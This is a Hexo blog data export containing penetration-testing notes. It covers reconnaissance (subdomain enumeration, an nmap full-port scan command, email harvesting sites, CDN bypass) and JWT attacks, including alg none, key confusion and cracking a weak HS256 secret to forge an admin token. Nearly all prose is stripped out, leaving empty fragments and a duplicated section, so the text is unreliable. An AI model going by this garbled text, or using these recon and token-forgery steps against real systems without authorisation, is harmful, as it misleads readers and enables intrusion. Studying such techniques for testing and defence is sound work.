title=\"\"></a></h4><p><strong></strong>dirsearchffuf</p>\n<p>ffuf  FFUZ FFUZ Github  4k  star <a class=\"link\"   href=\"https://github.com/TheKingOfDuck/fuzzDicts\" >https://github.com/TheKingOfDuck/fuzzDicts<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p></p>\n<p> Github </p>\n<p>+@</p>\n<p></p>\n<p><a class=\"link\"   href=\"https://www.skymem.info/\" >https://www.skymem.info/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://app.snov.io/domain-search\" >https://app.snov.io/domain-search<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://www.email-format.com/i/search/\" >https://www.email-format.com/i/search/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p> outlook </p>\n<p>()</p>\n<h4 id=\"ip\"><a href=\"#ip\" class=\"headerlink\" title=\"ip\"></a>ip</h4><p>cdnip</p>\n<p><strong>cdn</strong></p>\n<p>CDN</p>\n<p>CDNPingIPCDN<br>ping</p>\n<p><a class=\"link\"   href=\"https://asm.ca.com/en/ping.php\" >https://asm.ca.com/en/ping.php<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://ping.chinaz.com/\" >https://ping.chinaz.com/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"http://www.webkaka.com/ping.aspx\" >http://www.webkaka.com/ping.aspx<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151437964.png\"\n                        alt=\"-1687322375738\"\n                 ></p>\n<ul>\n<li></li>\n</ul>\n<p>cdnCDNIPhostCC80IP</p>\n<ul>\n<li>nslookup</li>\n</ul>\n<p><a class=\"link\"   href=\"http://tool.chinaz.com/nslookup\" >http://tool.chinaz.com/nslookup<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>DNSDNSCDNCDNIP</p>\n<ul>\n<li>ping</li>\n</ul>\n<p>ping example.com<a class=\"link\"   href=\"http://www.example.com,cdnwww.example.com/\" >www.example.comCDNwww.example.com<i class=\"fas fa-external-link-alt\"></i></a> cnameCDNping example.comIP</p>\n<h4 id=\"c\"><a href=\"#c\" class=\"headerlink\" title=\"c\"></a>c</h4><p>IP</p>\n<p><strong>C</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://hunter.qianxin.com/</span><br><span class=\"line\"> </span><br><span class=\"line\"> FOFAhttps://fofa.info/toLogin</span><br><span class=\"line\"> </span><br><span class=\"line\"> 360https://quake.360.net/#/index</span><br><span class=\"line\"> </span><br><span class=\"line\"> https://www.yunsee.cn/</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"whois\"><a href=\"#whois\" class=\"headerlink\" title=\"whois\"></a>whois</h4><p></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151437038.png\"\n                        alt=\"-1687322388065\"\n                 ></p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":" || ","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]}},"links":[{"name":"dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p> </p>\n<p><strong>&#x3D;&gt;&#x3D;&gt;&#x3D;&gt;&#x3D;&gt;&#x3D;&gt;&#x3D;&gt;</strong></p>\n<p></p>\n<h1 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"\"></a></h1><h3 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"\"></a></h3><h4 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"\"></a></h4><p> </p>\n<p><strong>&#x3D;&gt;&#x3D;&gt;&#x3D;&gt;&#x3D;&gt;&#x3D;&gt;&#x3D;&gt;</strong></p>\n<p></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p></p>\n<ul>\n<li><strong></strong></li>\n</ul>\n<p><a class=\"link\"   href=\"https://beian.miit.gov.cn/#/Integrated/index\" >https://beian.miit.gov.cn<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151436515.png\"\n                        alt=\"-1687322327126\"\n                 ></p>\n<ul>\n<li><p><strong></strong></p>\n<p><strong></strong></p>\n<p></p>\n<p><strong>fofa</strong></p>\n<p></p>\n</li>\n</ul>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151436630.png\"\n                        alt=\"-1687322359802\"\n                 ></p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p><strong>layer</strong></p>\n<p>OneForAll<a class=\"link\"   href=\"https://github.com/shmilylty/OneForAll\" >https://github.com/shmilylty/OneForAll<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p></p>\n<blockquote>\n<p></p>\n<p>1.</p>\n<p>2.<a class=\"link\"   href=\"https://www.sfn.cn/certificate.html\" >SSL<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>3.IP</p>\n<p>4.</p>\n</blockquote>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p><strong></strong> </p>\n<p><strong></strong>nmapgoby</p>\n<p>nmap</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -sS -Pn -n --open --min-hostgroup 4 --min-parallelism 1024 --host-timeout 30 -T4 -v -p 1-65535 -iL ip.txt -oX output.xml </span><br></pre></td></tr></table></figure>\n\n<p><strong></strong></p>\n<ul>\n<li><a class=\"link\"   href=\"http://duankou.wlphp.com/\" >http://duankou.wlphp.com/<i class=\"fas fa-external-link-alt\"></i></a></li>\n<li><a class=\"link\"   href=\"http://www.all-tool.cn/Tools/portblast/\" >http://www.all-tool.cn/Tools/portblast/<i class=\"fas fa-external-link-alt\"></i></a></li>\n<li>MaTools<a class=\"link\"   href=\"https://www.matools.com/port\" >https://www.matools.com/port<i class=\"fas fa-external-link-alt\"></i></a></li>\n</ul>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><pre><code>1CMSCMSCMSphpcmsecshop\n\n2HTML5jquerybootstrappureace\n\n3WebApachelighttpd, Nginx, IIS\n\n4TomcatJbossweblogicwebsphere\n\n5PHPJavaRubyPythonC#\n\n6linuxwin2k8win7kalicentos\n\n7CDNCDNcloudflare360cdn365cydyunjiasu\n\n8WAFwafTopsecJiasuleYundun\n\n9IPIP\n\n10\n</code></pre>\n<p></p>\n<blockquote>\n<blockquote>\n<p><strong></strong></p>\n<p><a class=\"link\"   href=\"https://www.yunsee.cn/\" >https://www.yunsee.cn/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><strong></strong></p>\n<p><a class=\"link\"   href=\"http://whatweb.bugscaner.com/look/\" >http://whatweb.bugscaner.com/look/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><strong>fofa,goby</strong></p>\n<p><a class=\"link\"   href=\"https://fofa.so/\" >https://fofa.so/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><strong>wappalyzer</strong></p>\n<p></p>\n<p><strong></strong></p>\n<p><a class=\"link\"   href=\"http://finger.tidesec.net/\" >http://finger.tidesec.net/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><strong></strong></p>\n<p><a class=\"link\"   href=\"https://fp.shuziguanxing.com/#/\" >https://fp.shuziguanxing.com/#/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><strong></strong></p>\n<p><a class=\"link\"   href=\"https://mp.weixin.qq.com/s/lHIJmIWbm8ylK6yjjmmNkg\" >https://mp.weixin.qq.com/s/lHIJmIWbm8ylK6yjjmmNkg<i class=\"fas fa-external-link-alt\"></i></a></p>\n</blockquote>\n</blockquote>\n<p></p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p></p>\n<p> <strong>Fofa</strong><strong>Shodan</strong><strong>360 </strong><strong></strong><strong> ZoomEye</strong> </p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p><strong></strong>dirsearchffuf</p>\n<p>ffuf  FFUZ FFUZ Github  4k  star <a class=\"link\"   href=\"https://github.com/TheKingOfDuck/fuzzDicts\" >https://github.com/TheKingOfDuck/fuzzDicts<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p></p>\n<p> Github </p>\n<p>+@</p>\n<p></p>\n<p><a class=\"link\"   href=\"https://www.skymem.info/\" >https://www.skymem.info/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://app.snov.io/domain-search\" >https://app.snov.io/domain-search<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://www.email-format.com/i/search/\" >https://www.email-format.com/i/search/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p> outlook </p>\n<p>()</p>\n<h4 id=\"ip\"><a href=\"#ip\" class=\"headerlink\" title=\"ip\"></a>ip</h4><p>cdnip</p>\n<p><strong>cdn</strong></p>\n<p>CDN</p>\n<p>CDNPingIPCDN<br>ping</p>\n<p><a class=\"link\"   href=\"https://asm.ca.com/en/ping.php\" >https://asm.ca.com/en/ping.php<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://ping.chinaz.com/\" >https://ping.chinaz.com/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"http://www.webkaka.com/ping.aspx\" >http://www.webkaka.com/ping.aspx<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151437964.png\"\n                        alt=\"-1687322375738\"\n                 ></p>\n<ul>\n<li></li>\n</ul>\n<p>cdnCDNIPhostCC80IP</p>\n<ul>\n<li>nslookup</li>\n</ul>\n<p><a class=\"link\"   href=\"http://tool.chinaz.com/nslookup\" >http://tool.chinaz.com/nslookup<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>DNSDNSCDNCDNIP</p>\n<ul>\n<li>ping</li>\n</ul>\n<p>ping example.com<a class=\"link\"   href=\"http://www.example.com,cdnwww.example.com/\" >www.example.comCDNwww.example.com<i class=\"fas fa-external-link-alt\"></i></a> cnameCDNping example.comIP</p>\n<h4 id=\"c\"><a href=\"#c\" class=\"headerlink\" title=\"c\"></a>c</h4><p>IP</p>\n<p><strong>C</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://hunter.qianxin.com/</span><br><span class=\"line\"> </span><br><span class=\"line\"> FOFAhttps://fofa.info/toLogin</span><br><span class=\"line\"> </span><br><span class=\"line\"> 360https://quake.360.net/#/index</span><br><span class=\"line\"> </span><br><span class=\"line\"> https://www.yunsee.cn/</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"whois\"><a href=\"#whois\" class=\"headerlink\" title=\"whois\"></a>whois</h4><p></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151437038.png\"\n                        alt=\"-1687322388065\"\n                 ></p>\n"},{"title":"JWT","date":"2022-01-13T14:27:22.000Z","excerpt":"JWT","_content":"\n\n\n# JWT\n\n### JWT\n\n> Json web token (JWT)JSON(RFC 7519)tokenSSOJWTtoken\n\njwtsession\n\n### session\n\n> httphttpcookiesession\n\n\n\n**session**session\n\n- **Session**session****\n- ****\n- **CSRF**:  cookie **cookie**\n\n\n\n### JWTSession\n\n********\n\n****\n\n- **SessionJWT**\n\n- **SessionJWT**\n- **Sessionsession idToken**\n\n![-1684742759615](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151430767.png)\n\n\n\n### Token  \n\n#### \n\nToken\n\n> HTTP\n\nSessionSession ID\n\n\n\n- **Sessions : **\n- **Scalability : Session**\n- **CORS : AJAX**\n- **CSRF : CSRF**\n\n#### Token\n\n- **Tokens**\n- **TokenCookieThe token, not a  cookie.TokenCookieCSRFtokenCookieCookie!**\n- **tokentokentokentoken**\n\n### JWT\n\nJSON Web Token\n\n- **Authorization** () : JWTJWTJWT\n- **Information Exchange** () : JSON Web  TokensJWTs/\n\n\n\n### JWT\n\nJSON Web Token(.)\n\n- **Header**\n- **Payload**\n- **Signature**\n\n\n\n#### Header\n\njwt\n\n- ****jwt\n- **** HMAC SHA256\n\n```\n{\n  'typ': 'JWT',\n  'alg': 'HS256'\n}\n```\n\n**base64**\n\n```\neyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9\n```\n\n\n\n> **JWTalgnone**\n>\n> **JWTNonealg NoneJWTtokentoken**\n\n\n\n#### Payload\n\npayload****\n\n- **registered** \n- **public** \n- **private** \n\n\n\n****\n\n- **iss: jwt**\n- **sub: jwt**\n- **aud: jwt**\n- **exp: jwt**\n- **nbf: jwt.**\n- **iat: jwt**\n- **jti: jwttoken**\n\n\n\n****\n\n********\n\n\n\n****\n\n****base64\n\n\n\n**payload**\n\n```\n{\n  \"sub\": \"1234567890\",\n  \"iss\": \"http://localhost:8000/auth/login\",\n  \"iat\": 1451888119,\n  \"exp\": 1454516119,\n  \"nbf\": 1451888119,\n  \"name\": \"John Doe\",\n  \"admin\": true\n}\n```\n\nbase64jwt\n\n```\neyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9\n```\n\n\n\n> JWTpayloadheader\n\n\n\n#### Signature\n\n**3**\n\n- **headerbase64**\n- **payloadbase64**\n- **secret**\n\nbase64headerbase64payload`.`header`secret`jwt\n\n```\n// javascript\nvar encodedString = base64UrlEncode(header) + '.' + base64UrlEncode(payload);\n\nvar signature = HMACSHA256(encodedString, 'secret'); // TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ\n```\n\n```\nHMACSHA256(base64UrlEncode(header) + \".\" + base64UrlEncode(payload), secret)\n```\n\n\n\n> **secretjwtsecretjwtjwtsecretjwt**\n\n\n\n### JWT\n\n**JWT****Cookie**loaclSrorageJWTCookieHTTP**<u>Header Authorization</u>**JWT**POST**\n\n\n\n`Authorization``Bearer`\n\n```\nfetch('api/user/1', {\n  headers: {\n    'Authorization': 'Bearer ' + token\n  }\n})\n```\n\n\n\n![-1684742819251](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151431006.png)\n\n\n\nJWTJWTJWTHTTPHTTPS\n\n\n\n### JWT\n\n- none\n- RS256HS256\n-  ****\n- \n\n**jwt**ctf\n\n\n\n#### JWT\n\n**JWT**\n\n```\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6ImZhbHNlIn0.oe4qhTxvJB8nNAsFWJc7_m3UylVZzO3FwhkYuESAyUM\n```\n\njwtencode https://jwt.io/\n\n![-1684742810710](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151432089.png)\n\n**falsetruefalsetruetokentoken**\n\n**keykeyHS256**\n\n****\n\n**key**\n\n\n\n**secret**\n\n  https://github.com/brendan-rius/c-jwt-cracker\n\n\n\n**key54l7y**\n\n**jwt**\n\n```\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6InRydWUifQ.hv55uOLPmX_C0Nx8qz-O2psgUq6V3EA0fgRqGFm5W6Q\n```\n\n","source":"_posts/JWT.md","raw":"---\ntitle: JWT\ndate: 2022-01-13 22:27:22\nexcerpt: JWT\ncategories: \n---\n\n\n\n# JWT\n\n### JWT\n\n> Json web token (JWT)JSON(RFC 7519)tokenSSOJWTtoken\n\njwtsession\n\n### session\n\n> httphttpcookiesession\n\n\n\n**session**session\n\n- **Session**session****\n- ****\n- **CSRF**:  cookie **cookie**\n\n\n\n### JWTSession\n\n********\n\n****\n\n- **SessionJWT**\n\n- **SessionJWT**\n- **Sessionsession idToken**\n\n![-1684742759615](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151430767.png)\n\n\n\n### Token  \n\n#### \n\nToken\n\n> HTTP\n\nSessionSession ID\n\n\n\n- **Sessions : **\n- **Scalability : Session**\n- **CORS : AJAX**\n- **CSRF : CSRF**\n\n#### Token\n\n- **Tokens**\n- **TokenCookieThe token, not a  cookie.TokenCookieCSRFtokenCookieCookie!**\n- **tokentokentokentoken**\n\n### JWT\n\nJSON Web Token\n\n- **Authorization** () : JWTJWTJWT\n- **Information Exchange** () : JSON Web  TokensJWTs/\n\n\n\n### JWT\n\nJSON Web Token(.)\n\n- **Header**\n- **Payload**\n- **Signature**\n\n\n\n#### Header\n\njwt\n\n- ****jwt\n- **** HMAC SHA256\n\n```\n{\n  'typ': 'JWT',\n  'alg': 'HS256'\n}\n```\n\n**base64**\n\n```\neyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9\n```\n\n\n\n> **JWTalgnone**\n>\n> **JWTNonealg NoneJWTtokentoken**\n\n\n\n#### Payload\n\npayload****\n\n- **registered** \n- **public** \n- **private** \n\n\n\n****\n\n- **iss: jwt**\n- **sub: jwt**\n- **aud: jwt**\n- **exp: jwt**\n- **nbf: jwt.**\n- **iat: jwt**\n- **jti: jwttoken**\n\n\n\n****\n\n********\n\n\n\n****\n\n****base64\n\n\n\n**payload**\n\n```\n{\n  \"sub\": \"1234567890\",\n  \"iss\": \"http://localhost:8000/auth/login\",\n  \"iat\": 1451888119,\n  \"exp\": 1454516119,\n  \"nbf\": 1451888119,\n  \"name\": \"John Doe\",\n  \"admin\": true\n}\n```\n\nbase64jwt\n\n```\neyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9\n```\n\n\n\n> JWTpayloadheader\n\n\n\n#### Signature\n\n**3**\n\n- **headerbase64**\n- **payloadbase64**\n- **secret**\n\nbase64headerbase64payload`.`header`secret`jwt\n\n```\n// javascript\nvar encodedString = base64UrlEncode(header) + '.' + base64UrlEncode(payload);\n\nvar signature = HMACSHA256(encodedString, 'secret'); // TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ\n```\n\n```\nHMACSHA256(base64UrlEncode(header) + \".\" + base64UrlEncode(payload), secret)\n```\n\n\n\n> **secretjwtsecretjwtjwtsecretjwt**\n\n\n\n### JWT\n\n**JWT****Cookie**loaclSrorageJWTCookieHTTP**<u>Header Authorization</u>**JWT**POST**\n\n\n\n`Authorization``Bearer`\n\n```\nfetch('api/user/1', {\n  headers: {\n    'Authorization': 'Bearer ' + token\n  }\n})\n```\n\n\n\n![-1684742819251](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151431006.png)\n\n\n\nJWTJWTJWTHTTPHTTPS\n\n\n\n### JWT\n\n- none\n- RS256HS256\n-  ****\n- \n\n**jwt**ctf\n\n\n\n#### JWT\n\n**JWT**\n\n```\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6ImZhbHNlIn0.oe4qhTxvJB8nNAsFWJc7_m3UylVZzO3FwhkYuESAyUM\n```\n\njwtencode https://jwt.io/\n\n![-1684742810710](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151432089.png)\n\n**falsetruefalsetruetokentoken**\n\n**keykeyHS256**\n\n****\n\n**key**\n\n\n\n**secret**\n\n  https://github.com/brendan-rius/c-jwt-cracker\n\n\n\n**key54l7y**\n\n**jwt**\n\n```\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6InRydWUifQ.hv55uOLPmX_C0Nx8qz-O2psgUq6V3EA0fgRqGFm5W6Q\n```\n\n","slug":"JWT","published":1,"updated":"2024-04-17T08:43:00.255Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clv3kf7ja000rh7761l7x9yqt","content":"<h1 id=\"JWT\"><a href=\"#JWT\" class=\"headerlink\" title=\"JWT\"></a>JWT</h1><h3 id=\"JWT\"><a href=\"#JWT\" class=\"headerlink\" title=\"JWT\"></a>JWT</h3><blockquote>\n<p>Json web token (JWT)JSON(RFC 7519)tokenSSOJWTtoken</p>\n</blockquote>\n<p>jwtsession</p>\n<h3 id=\"session\"><a href=\"#session\" class=\"headerlink\" title=\"session\"></a>session</h3><blockquote>\n<p>httphttpcookiesession</p>\n</blockquote>\n<p><strong>session</strong>session</p>\n<ul>\n<li><strong>Session</strong>session<strong></strong></li>\n<li><strong></strong></li>\n<li><strong>CSRF</strong>:  cookie <strong>cookie</strong></li>\n</ul>\n<h3 id=\"JWTSession\"><a href=\"#JWTSession\" class=\"headerlink\" title=\"JWTSession\"></a>JWTSession</h3><p><strong></strong><strong></strong></p>\n<p><strong></strong></p>\n<ul>\n<li><p><strong>SessionJWT</strong></p>\n</li>\n<li><p><strong>SessionJWT</strong></p>\n</li>\n<li><p><strong>Sessionsession idToken</strong></p>\n</li>\n</ul>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151430767.png\"\n                        alt=\"-1684742759615\"\n                 ></p>\n<h3 id=\"Token--\"><a href=\"#Token--\" class=\"headerlink\" title=\"Token  \"></a>Token  </h3><h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p>Token</p>\n<blockquote>\n<p>HTTP</p>\n</blockquote>\n<p>SessionSession ID</p>\n<p></p>\n<ul>\n<li><strong>Sessions : </strong></li>\n<li><strong>Scalability : Session</strong></li>\n<li><strong>CORS : AJAX</strong></li>\n<li><strong>CSRF : CSRF</strong></li>\n</ul>\n<h4 id=\"Token\"><a href=\"#Token\" class=\"headerlink\" title=\"Token\"></a>Token</h4><ul>\n<li><strong>Tokens</strong></li>\n<li><strong>TokenCookieThe token, not a  cookie.TokenCookieCSRFtokenCookieCookie!</strong></li>\n<li><strong>tokentokentokentoken</strong></li>\n</ul>\n<h3 id=\"JWT\"><a href=\"#JWT\" class=\"headerlink\" title=\"JWT\"></a>JWT</h3><p>JSON Web Token</p>\n<ul>\n<li><strong>Authorization</strong> () : JWTJWTJWT</li>\n<li><strong>Information Exchange</strong> () : JSON Web  TokensJWTs&#x2F;</li>\n</ul>\n<h3 id=\"JWT\"><a href=\"#JWT\" class=\"headerlink\" title=\"JWT\"></a>JWT</h3><p>JSON Web Token(.)</p>\n<ul>\n<li><strong>Header</strong></li>\n<li><strong>Payload</strong></li>\n<li><strong>Signature</strong></li>\n</ul>\n<p></p>\n<h4 id=\"Header\"><a href=\"#Header\" class=\"headerlink\" title=\"Header\"></a>Header</h4><p>jwt</p>\n<ul>\n<li><strong></strong>jwt</li>\n<li><strong></strong> HMAC SHA256</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  &#x27;typ&#x27;: &#x27;JWT&#x27;,</span><br><span class=\"line\">  &#x27;alg&#x27;: &#x27;HS256&#x27;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>base64</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</span><br></pre></td></tr></table></figure>\n\n\n\n<blockquote>\n<p><strong>JWTalgnone</strong></p>\n<p><strong>JWTNonealg NoneJWTtokentoken</strong></p>\n</blockquote>\n<h4 id=\"Payload\"><a href=\"#Payload\" class=\"headerlink\" title=\"Payload\"></a>Payload</h4><p>payload<strong></strong></p>\n<ul>\n<li><strong>registered</strong> </li>\n<li><strong>public</strong> </li>\n<li><strong>private</strong> </li>\n</ul>\n<p><strong></strong></p>\n<ul>\n<li><strong>iss: jwt</strong></li>\n<li><strong>sub: jwt</strong></li>\n<li><strong>aud: jwt</strong></li>\n<li><strong>exp: jwt</strong></li>\n<li><strong>nbf: jwt.</strong></li>\n<li><strong>iat: jwt</strong></li>\n<li><strong>jti: jwttoken</strong></li>\n</ul>\n<p><strong></strong></p>\n<p><strong></strong><strong></strong></p>\n<p><strong></strong></p>\n<p><strong></strong>base64</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;sub&quot;: &quot;1234567890&quot;,</span><br><span class=\"line\">  &quot;iss&quot;: &quot;http://localhost:8000/auth/login&quot;,</span><br><span class=\"line\">  &quot;iat&quot;: 1451888119,</span><br><span class=\"line\">  &quot;exp&quot;: 1454516119,</span><br><span class=\"line\">  &quot;nbf&quot;: 1451888119,</span><br><span class=\"line\">  &quot;name&quot;: &quot;John Doe&quot;,</span><br><span class=\"line\">  &quot;admin&quot;: true</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>base64jwt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9</span><br></pre></td></tr></table></figure>\n\n\n\n<blockquote>\n<p>JWTpayloadheader</p>\n</blockquote>\n<h4 id=\"Signature\"><a href=\"#Signature\" class=\"headerlink\" title=\"Signature\"></a>Signature</h4><p><strong>3</strong></p>\n<ul>\n<li><strong>headerbase64</strong></li>\n<li><strong>payloadbase64</strong></li>\n<li><strong>secret</strong></li>\n</ul>\n<p>base64headerbase64payload<code>.</code>header<code>secret</code>jwt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// javascript</span><br><span class=\"line\">var encodedString = base64UrlEncode(header) + &#x27;.&#x27; + base64UrlEncode(payload);</span><br><span class=\"line\"></span><br><span class=\"line\">var signature = HMACSHA256(encodedString, &#x27;secret&#x27;); // TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HMACSHA256(base64UrlEncode(header) + &quot;.&quot; + base64UrlEncode(payload), secret)</span><br></pre></td></tr></table></figure>\n\n\n\n<blockquote>\n<p><strong>secretjwtsecretjwtjwtsecretjwt</strong></p>\n</blockquote>\n<h3 